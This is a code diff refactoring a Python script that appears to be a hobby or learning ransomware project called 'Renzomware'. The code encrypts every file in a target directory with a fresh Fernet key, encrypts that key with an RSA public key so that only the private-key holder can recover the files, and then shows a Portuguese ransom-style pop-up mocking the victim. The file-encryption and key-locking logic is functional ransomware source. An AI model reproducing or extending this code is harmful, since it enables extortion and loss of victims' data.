@@ -21,6 +21,25 @@ def read_public_key(filename):
     return public_key
 
 
+def generate_sym_key():
+    key = Fernet.generate_key()
+    return key
+
+
+def encrypt_sym_key(sym_key, public_key, sym_key_filename):
+    encrypted_key = public_key.encrypt(
+        sym_key,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+
+    with open(sym_key_filename, "wb") as encrypted_key_file:
+        encrypted_key_file.write(encrypted_key)
+
+
 def encrypt_file(filename, key):
     with open(filename, "rb") as file_to_encrypt:
         file_data = file_to_encrypt.read()
@@ -31,31 +50,17 @@ def encrypt_file(filename, key):
         encrypted_file.write(encrypted_data)
 
 
-def encrypt_files(files, public_key, sym_key_file_name):
-    sym_key = Fernet.generate_key()
+def main():
+    public_key = read_public_key(PUBLIC_ASYM_KEY_FILE_NAME)
+
+    sym_key = generate_sym_key()
+
+    files = list_files(TEST_DIR_TO_ENCRYPT)
 
     for filename in files:
         encrypt_file(filename,  sym_key)
 
-    encrypted_key = public_key.encrypt(
-        sym_key,
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None
-        )
-    )
-
-    with open(sym_key_file_name, "wb") as encrypted_key_file:
-        encrypted_key_file.write(encrypted_key)
-
-
-def main():
-    public_key = read_public_key(PUBLIC_ASYM_KEY_FILE_NAME)
-
-    files = list_files(TEST_DIR_TO_ENCRYPT)
-
-    encrypt_files(files, public_key, SYM_KEY_FILE_NAME)
+    encrypt_sym_key(sym_key, public_key, SYM_KEY_FILE_NAME)
 
     show_pop_up("Toma um Renzomware!!", "Seus arquivos de gatinhos agora estão encriptados, muahaha!!")
 
